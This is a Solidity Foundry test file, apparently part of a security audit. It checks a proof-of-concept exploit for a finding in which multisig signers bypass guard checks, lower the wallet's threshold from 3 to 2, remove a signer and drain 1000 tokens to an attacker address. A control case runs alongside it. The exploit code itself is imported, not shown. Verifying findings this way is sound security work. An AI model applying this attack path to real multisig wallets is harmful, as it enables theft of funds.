// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, ControlExploit} from
    "./10281-h-9-signers-can-bypass-checks-and-change-threshold-within-a.sol";

contract Finding10281Test is Test {
    function test_exploit_lowers_threshold_and_pays_with_two_signatures() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.safe().getThreshold(), 2, "threshold ended at 2");
        assertLt(e.safe().getThreshold(), e.OLD_THRESHOLD(), "threshold is lower than 3");
        assertEq(e.token().balanceOf(e.ATTACKER()), 1000 ether, "attacker received 1000");
        assertEq(e.token().balanceOf(address(e.safe())), 0, "safe emptied");
        assertEq(e.gate().correctThreshold(), 2, "post-check target is the new count");
        assertEq(e.safe().ownerCount(), 2, "one signer removed");

        console2.log("threshold", e.safe().getThreshold());
        console2.log("paid", e.token().balanceOf(e.ATTACKER()));
        console2.log("old threshold", e.OLD_THRESHOLD());
    }

    function test_control_keeps_threshold_and_blocks_two_signatures() public {
        ControlExploit c = new ControlExploit();
        c.run();

        assertEq(c.safe().getThreshold(), 3, "threshold stayed 3");
        assertEq(c.safe().ownerCount(), 3, "signer was not removed");
        assertEq(c.token().balanceOf(c.ATTACKER()), 1000 ether, "three signatures still pay");
        assertEq(c.token().balanceOf(address(c.safe())), 0, "paid only at the old threshold");

        console2.log("control threshold", c.safe().getThreshold());
        console2.log("control paid", c.token().balanceOf(c.ATTACKER()));
    }
}
